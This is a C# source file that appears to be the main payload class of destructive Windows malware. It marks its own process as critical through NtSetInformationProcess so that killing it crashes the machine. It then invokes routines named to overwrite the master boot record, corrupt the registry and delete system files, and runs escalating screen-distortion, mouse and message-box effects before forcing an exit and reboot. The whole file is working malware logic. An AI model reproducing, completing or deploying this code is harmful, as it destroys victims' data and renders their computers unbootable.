using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using CsharpGDI;
using System.Threading;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace rover
{
    public partial class Destructive
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        int isCritical = 1;
        int BreakOnTermination = 0x1D;
        private static int range = 35;
        private GDI gdi;
        private Timer t_ph2, t_ph3, t_end;
        private Thread th_ph1, th_beat, th_msg, th_move, th_change;
        private static int speed = 300;
        private Rover_Win main;
        public Destructive(Rover_Win maininstance)
        {
            main = maininstance;
        }
        public void destructive_main()
        {
            Thread.Sleep(3000);
            while (TTS_engine.is_speaking) { Thread.Sleep(1); }
            Beats c_beat = new Beats();
            th_beat = new Thread(c_beat.beat);
            th_beat.Start();
            th_ph1 = new Thread(Phase1);
            th_ph1.Start();
            Move_Event c_move = new Move_Event();
            th_change = new Thread(c_move.change_text);
            th_change.Start();
            Process.EnterDebugMode();
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
            Mbr_writter c_mbr = new Mbr_writter();
            c_mbr.mbr_main();
            Registry_Corrupt c_regdel = new Registry_Corrupt();
            c_regdel.reg_main();
            File_Corrupt c_sysdel = new File_Corrupt();
            c_sysdel.sys_del();
        }
        private void Phase1(object obj)
        {
            t_ph2 = new Timer(Phase2, null, 60000, -1);
            t_ph3 = new Timer(Phase3, null, 120000, -1);
            t_end = new Timer(End, null, 180000, -1);
            Random rand;
            int x = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width;
            int y = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height;
            gdi = new GDI();
            while (true)
            {
                rand = new Random();
                int rnd_result = rand.Next(range);
                switch (rnd_result)
                {
                    case 0:
                        gdi.Filter(0, 0, x, y, Color.FromArgb(rand.Next(255), rand.Next(255), rand.Next(255)), (byte)rand.Next(50, 255));
                        break;
                    case 1:
                        for (int i = 0; i < rand.Next(1, 10); i++)
                            gdi.RQuad(rand.Next(-5, 5), 0, x, y, 32, (byte)rand.Next(50, 150), rand.Next(7));
                        break;
                    case 2:
                        gdi.Light(1, 1, x, y);
                        break;
                    case 3:
                        gdi.Dark(1, 1, x, y);
                        break;
                    case 4:
                        for (int i = 0; i < rand.Next(1, 5); i++)
                            gdi.Pattern(0, 0, x, y);
                        break;
                    case 5:
                        for (int i = 0; i < rand.Next(1, 10); i++)
                            gdi.Melt(0, 0, x, y, rand.Next(3));
                        break;
                    case 6:
                        gdi.RQuad(rand.Next(-10, 10), rand.Next(-10, 10), x, y, 32, 100, -1);
                        break;
                    case 7:
                        gdi.RQuad(rand.Next(-10, 10), 0, x, y, 32, 100, -1);
                        break;
                    case 8:
                        gdi.RQuad(0, rand.Next(-10, 10), x, y, 32, 100, -1);
                        break;
                    case 9:
                        for (int i = 0; i < rand.Next(1, 10); i++)
                            gdi.RQuad(rand.Next(-5, 5), 0, x, y, 32, (byte)rand.Next(50, 150), rand.Next(7));
                        break;
                    case 10:
                        gdi.RQuad(0, 0, x, y, 1, (byte)rand.Next(50, 150), -1);
                        break;
                    case 11:
                        for (int i = 0; i < rand.Next(1, 10); i++)
                        {
                            gdi.Blt(x - 50, 0, x, y);
                            gdi.Blt(-50, 0, x, y);
                        }
                        break;
                    case 12:
                        for (int i = 0; i < rand.Next(1, 20); i++)
                        {
                            gdi.Blt(rand.Next(-50, 50), rand.Next(-50, 50), x, y);
                        }
                        break;
                    case 13:
                        for (int i = 0; i < rand.Next(1, 15); i++)
                        {
                            gdi.Plg();
                        }
                        break;
                    default:
                        Mouse_Input c_mouse = new Mouse_Input();
                        c_mouse.mouse_main(rand.Next(x), rand.Next(y), rand.Next(20));
                        gdi.erase_tool();
                        break;
                }
                Thread.Sleep(speed);
            }
        }
        private void Phase2(object obj)
        {
            range = 25;
            Beats c_beat = new Beats();
            Beats.style = 1;
            Beats.speed = 35;
            th_beat.Abort();
            th_beat = new Thread(c_beat.beat);
            th_beat.Start();
            speed = 100;
            Random rand;
            while (true)
            {
                rand = new Random();
                int rnd_result = rand.Next(range);
                switch (rnd_result)
                {
                    case 14:
                        Msg_Boxes c_msg = new Msg_Boxes();
                        th_msg = new Thread(c_msg.msg_main);
                        th_msg.Start();
                        Thread.Sleep(100);
                        th_msg.Abort();
                        Move_Event c_move = new Move_Event();
                        th_move = new Thread(c_move.move_window);
                        th_move.Start(rand.Next(3));
                        break;
                }
                Thread.Sleep(500);
            }
        }
        private void Phase3(object obj)
        {
            range = 15;
            Beats c_beat = new Beats();
            Beats.style = 2;
            Beats.speed = 20;
            th_beat.Abort();
            th_beat = new Thread(c_beat.beat);
            th_beat.Start();
            speed = 1;
        }
        private void End(object obj)
        {
            Environment.Exit(-1);
            Force_Reboot c_reboot = new Force_Reboot();
            c_reboot.Reboot();
        }
    }
}
